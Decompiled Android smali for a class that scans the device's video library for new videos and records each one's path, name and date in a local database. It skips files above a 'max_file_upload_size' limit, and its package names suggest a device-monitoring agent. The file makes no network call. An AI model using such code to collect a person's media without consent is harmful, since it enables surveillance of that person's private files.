.class public Lcom/hp/vd/module/monitor/video/VideoCallable;
.super Ljava/lang/Object;
.source "VideoCallable.java"

# interfaces
.implements Ljava/util/concurrent/Callable;


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/lang/Object;",
        "Ljava/util/concurrent/Callable<",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# static fields
.field protected static final TAG:Ljava/lang/String; = "VideoCallable"


# instance fields
.field protected contentResolver:Landroid/content/ContentResolver;

.field protected contentUri:Landroid/net/Uri;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/VideoData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected videoObserver:Lcom/hp/vd/module/monitor/video/VideoObserver;


# direct methods
.method public constructor <init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/video/VideoObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ContentResolver;",
            "Landroid/net/Uri;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/VideoData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/module/monitor/video/VideoObserver;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 45
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 29
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->contentResolver:Landroid/content/ContentResolver;

    .line 30
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->contentUri:Landroid/net/Uri;

    .line 31
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 32
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 33
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->videoObserver:Lcom/hp/vd/module/monitor/video/VideoObserver;

    .line 34
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 46
    iput-object p1, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->contentResolver:Landroid/content/ContentResolver;

    .line 47
    iput-object p2, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->contentUri:Landroid/net/Uri;

    .line 48
    iput-object p3, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 49
    iput-object p4, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 50
    iput-object p5, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->videoObserver:Lcom/hp/vd/module/monitor/video/VideoObserver;

    .line 51
    iput-object p6, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 52
    iput-object p7, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public bridge synthetic call()Ljava/lang/Object;
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 24
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/video/VideoCallable;->call()Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method

.method public call()Ljava/lang/Void;
    .locals 12
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    const/4 v0, 0x0

    .line 65
    :try_start_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->contentResolver:Landroid/content/ContentResolver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->contentUri:Landroid/net/Uri;

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "_id > "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v6, "max_internal_video_id"

    .line 68
    invoke-virtual {v5, v6}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    const-string v6, "_id"

    .line 65
    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1
    :try_end_0
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v1, :cond_0

    .line 80
    iget-object v1, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "VideoCallable"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Could not open a cursor for: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->contentUri:Landroid/net/Uri;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x3

    invoke-interface {v1, v2, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-object v0

    .line 89
    :cond_0
    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v2

    .line 91
    iget-object v3, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "VideoCallable"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "call(): total entries: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v6, " with "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "_id"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, " > "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v7, "max_internal_video_id"

    .line 93
    invoke-virtual {v6, v7}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 91
    invoke-interface {v3, v4, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    if-nez v2, :cond_1

    .line 97
    iget-object v1, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "VideoCallable"

    const-string v3, "call(): no entries. Exiting..."

    invoke-interface {v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-object v0

    :cond_1
    const/4 v2, -0x1

    const/4 v3, 0x0

    move v4, v2

    .line 102
    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v5

    if-eqz v5, :cond_3

    const-string v5, "_data"

    .line 103
    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    .line 104
    new-instance v6, Ljava/io/File;

    invoke-direct {v6, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 106
    invoke-virtual {v6}, Ljava/io/File;->length()J

    move-result-wide v7

    iget-object v9, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v10, "max_file_upload_size"

    invoke-virtual {v9, v10}, Lcom/hp/vd/data/ModuleData;->customGetLong(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Long;->longValue()J

    move-result-wide v9

    cmp-long v11, v7, v9

    if-lez v11, :cond_2

    .line 107
    iget-object v7, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v8, "VideoCallable"

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "The file at: "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " ("

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 109
    invoke-virtual {v6}, Ljava/io/File;->length()J

    move-result-wide v5

    const-wide/16 v10, 0x400

    div-long/2addr v5, v10

    div-long/2addr v5, v10

    invoke-virtual {v9, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v5, "MB.) is bigger than "

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "max_file_upload_size"

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ". Skipping this record."

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 107
    invoke-interface {v7, v8, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    goto :goto_0

    :cond_2
    add-int/lit8 v3, v3, 0x1

    .line 122
    new-instance v4, Lcom/hp/vd/data/VideoData;

    invoke-direct {v4}, Lcom/hp/vd/data/VideoData;-><init>()V

    const-string v6, "_id"

    .line 124
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getInt(I)I

    move-result v6

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    iput-object v6, v4, Lcom/hp/vd/data/VideoData;->internalId:Ljava/lang/Integer;

    .line 126
    iput-object v5, v4, Lcom/hp/vd/data/VideoData;->url:Ljava/lang/String;

    const-string v5, "_display_name"

    .line 127
    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/VideoData;->name:Ljava/lang/String;

    const-string v5, "date_added"

    .line 129
    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v5

    invoke-static {v5, v6}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v5

    .line 130
    new-instance v6, Ljava/util/Date;

    invoke-virtual {v5}, Ljava/lang/Long;->longValue()J

    move-result-wide v7

    invoke-direct {v6, v7, v8}, Ljava/util/Date;-><init>(J)V

    iput-object v6, v4, Lcom/hp/vd/data/VideoData;->createdAt:Ljava/util/Date;

    .line 136
    iget-object v5, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v5, v4}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 138
    iget-object v4, v4, Lcom/hp/vd/data/VideoData;->internalId:Ljava/lang/Integer;

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v4

    goto/16 :goto_0

    .line 141
    :cond_3
    iget-object v5, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v6, "VideoCallable"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "run(): videos listed = "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v5, v6, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 143
    invoke-interface {v1}, Landroid/database/Cursor;->isClosed()Z

    move-result v3

    if-nez v3, :cond_4

    .line 144
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    :cond_4
    if-eq v4, v2, :cond_5

    .line 148
    iget-object v1, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_internal_video_id"

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 150
    iget-object v1, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v1, v2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    :cond_5
    return-object v0

    :catch_0
    move-exception v1

    .line 74
    iget-object v2, p0, Lcom/hp/vd/module/monitor/video/VideoCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "VideoCallable"

    const-string v4, "SQLiteException caught while quering contentResolver"

    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v0
.end method
